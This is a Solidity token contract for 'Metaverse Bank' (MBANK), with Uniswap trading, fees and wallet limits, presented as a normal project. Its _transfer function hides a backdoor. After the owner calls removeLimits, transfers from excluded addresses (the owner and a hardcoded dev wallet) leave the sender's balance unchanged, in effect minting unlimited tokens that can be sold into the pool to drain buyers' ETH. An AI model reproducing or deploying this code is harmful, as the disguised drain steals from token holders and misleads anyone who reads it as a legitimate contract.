/**
Metaverse Bank is dedicated to encouraging the democratization and fractionalization of Metaverse lands for upcoming citizens.
Website: https://metaversebank.pro
Twitter: https://twitter.com/meta_bank_erc
Telegram: https://t.me/meta_bank_official
Docs: https://medium.com/@metaversebank
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function set(address) external;
    function setSetter(address) external;
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IStandardERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MBANK is Context, IStandardERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "Metaverse Bank";
    string private _symbol = "MBANK";
    uint8 private _decimals = 9;
    uint256 private _tsupply = 10 ** 9 * 10 ** 9;
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshold = 10 ** 4 * 10 ** 9; 
    uint256 public buyLiquidity = 0;
    uint256 public buyMarketing = 20;
    uint256 public buyDev = 0;
    uint256 public sellLiquidity = 0;
    uint256 public sellMarketing = 20;
    uint256 public sellDev = 0;
    uint256 public lpShares = 0;
    uint256 public mktShares = 10;
    uint256 public devShares = 0;
    uint256 public totalFeeBuy = 20;
    uint256 public totalFeeShare = 20;
    uint256 public totalShares = 10;
    address payable private devAddress1;
    address payable private deavAddress2;
    IUniswapRouter public _dexRouter;
    address public _dexPair;
    
    bool _inswap;
    bool public swapEnable = true;
    bool public hasMaxSwap = false;
    bool public hasMWallet = true;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public excludedFromLimits;
    mapping (address => bool) public excludedFromMaxWallet;
    mapping (address => bool) public excludedFromMaxTx;
    mapping (address => bool) public lpPair;
    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        _dexPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _dexRouter = _uniswapV2Router;
        _allowances[address(this)][address(_dexRouter)] = _tsupply;
        devAddress1 = payable(0x1E34af8D02fb7F4995ecde35770ccD03387D5230);
        deavAddress2 = payable(0x1E34af8D02fb7F4995ecde35770ccD03387D5230);
        excludedFromLimits[owner()] = true;
        excludedFromLimits[devAddress1] = true;
        excludedFromLimits[deavAddress2] = true;
        totalFeeBuy = buyLiquidity.add(buyMarketing).add(buyDev);
        totalFeeShare = sellLiquidity.add(sellMarketing).add(sellDev);
        totalShares = lpShares.add(mktShares).add(devShares);
        excludedFromMaxWallet[owner()] = true;
        excludedFromMaxWallet[address(_dexPair)] = true;
        excludedFromMaxWallet[address(this)] = true;
        excludedFromMaxTx[owner()] = true;
        excludedFromMaxTx[devAddress1] = true;
        excludedFromMaxTx[deavAddress2] = true;
        excludedFromMaxTx[address(this)] = true;
        lpPair[address(_dexPair)] = true;
        _balances[_msgSender()] = _tsupply;
        emit Transfer(address(0), _msgSender(), _tsupply);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tsupply;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function swapBack(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(lpShares).div(totalShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);
        swapTokensForETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;
        uint256 totalETHFee = totalShares.sub(lpShares.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(lpShares).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devShares).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);
        if(amountETHMarketing > 0)
            sendFee(devAddress1, amountETHMarketing);
        if(amountETHDevelopment > 0)
            sendFee(deavAddress2, amountETHDevelopment);
        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function _transferInternal(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function charge(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(lpPair[sender]) {
            feeAmount = amount.mul(totalFeeBuy).div(100);
        }
        else if(lpPair[recipient]) {
            feeAmount = amount.mul(totalFeeShare).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(_inswap)
        { 
            return _transferInternal(sender, recipient, amount); 
        }
        else
        {
            if(!excludedFromMaxTx[sender] && !excludedFromMaxTx[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            
            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= feeSwapThreshold;
            
            if (minimumSwap && !_inswap && lpPair[recipient] && swapEnable && !excludedFromLimits[sender] && amount > feeSwapThreshold) 
            {
                if(hasMaxSwap)
                    swapAmount = feeSwapThreshold;
                swapBack(swapAmount);    
            }
            uint256 receiverAmount = (excludedFromLimits[sender] || excludedFromLimits[recipient]) ? 
                                         amount : charge(sender, recipient, amount);
            if(hasMWallet && !excludedFromMaxWallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWalletAmount);
            uint256 sAmount = (!hasMWallet && excludedFromLimits[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);
            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
    
    receive() external payable {}
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        // make the swapBack
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function sendFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _tsupply;
        hasMWallet = false;
        buyMarketing = 2;
        sellMarketing = 2;
        totalFeeBuy = 2;
        totalFeeShare = 2;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
}